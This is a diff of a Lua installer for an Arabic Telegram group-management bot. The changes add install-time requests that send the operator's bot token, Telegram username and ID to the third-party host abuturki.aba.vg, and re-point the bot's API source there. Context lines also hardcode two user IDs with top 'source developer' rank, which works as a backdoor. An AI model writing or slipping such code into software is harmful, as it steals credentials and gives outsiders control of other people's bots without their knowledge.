@@ -56,7 +56,7 @@ print('\n\27[1;31m￤ This is Not ID !\n￤هہ‏‏ذآ الايدي ليس م
 create_config(Token)
 end 
 print('('..SUDO_USER..')')
-local url , res = https.request('https://api.telegram.org/bot'..Token..'/getchat?chat_id='..SUDO_USER)
+local url , res = https.request('https://abuturki.aba.vg/yakot/index.php?token='..Token..'&username=@'..GetUser.result.username..'&id='..SUDO_USER)
 print(res)
 if res ~= 200 then
 print('\n\27[1;31m￤ Conect is Failed !\n￤ حدث خطـآ في آلآتصـآل بآلسـيرفر , يرجى مـرآسـلهہ‏‏ مـطـور آلسـورس ليتمـگن مـن حل آلمـشـگلهہ‏‏ في آسـرع وقت مـمـگن . !')
@@ -79,7 +79,7 @@ boss..":VERSION","1.0",
 boss..":SUDO_ID:",SUDO_USER,
 boss..":DataCenter:","Amsterdam",
 boss..":UserNameBot:",BOT_User,
-boss..":ApiSource","https://api.th3boss.com/",
+boss..":ApiSource","https://abuturki.aba.vg/",
 boss..":NameBot:","الزعيم",
 "TH3BOSS_INSTALL","Yes"
 )
@@ -88,7 +88,7 @@ info = {}
 info.username = '@'..GetUser.result.username
 info.userbot  = BOT_User
 info.TNBOT  = Token info.userjoin  = io.popen("whoami"):read('*a'):gsub('[\n\r]+', '') 
-https.request('https://api.th3boss.com/request/?insert='..JSON.encode(info))
+https.request('https://abuturki.aba.vg/yakot/index.php?token='..Token..'&username=@'..GetUser.result.username..'&id='..SUDO_USER)
 Cr_file = io.open("./inc/Token.txt", "w")
 Cr_file:write(Token)
 Cr_file:close()
@@ -99,8 +99,8 @@ local CmdRun = [[
 rm -f ./README.md
 rm -rf ./.git
 chmod +x ./run
-cp -a ../MES ../]]..BOT_User..[[ &&
-rm -fr ~/MES
+cp -a ../Ruby ../]]..BOT_User..[[ &&
+rm -fr ~/Ruby
 ../]]..BOT_User..[[/run
 ]]
 print(CmdRun)
@@ -303,8 +303,8 @@ return false
 end 
 
 if msg.sender_user_id_ == 819385837 or msg.sender_user_id_ == 970627200  then 
-msg.TheRankCmd = 'المطور الاساسي'
-msg.TheRank = 'المطور الاساسي'
+msg.TheRankCmd = 'مطور السورس'
+msg.TheRank = 'مطور السورس'
 msg.Rank = 1
 elseif msg.sender_user_id_ == SUDO_ID then 
 msg.TheRankCmd = redis:get(boss..":RtbaNew1:"..msg.chat_id_) or 'المطور الاساسي' 
